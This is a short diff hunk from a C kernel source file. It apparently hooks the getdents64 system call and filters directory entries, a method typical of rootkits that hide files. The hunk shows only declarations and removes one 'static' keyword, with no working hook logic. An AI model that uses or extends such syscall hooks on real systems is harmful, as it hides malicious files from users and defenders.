@@ -27,7 +27,7 @@ typedef asmlinkage int (*getdents64_regs_t)(const struct pt_regs *regs);
 extern unsigned long __force_order;
 static asmlinkage getdents64_t orig_getdents64;
 
-static struct filtered_dirent
+struct filtered_dirent
 {
     char *buffer;
     unsigned int size;
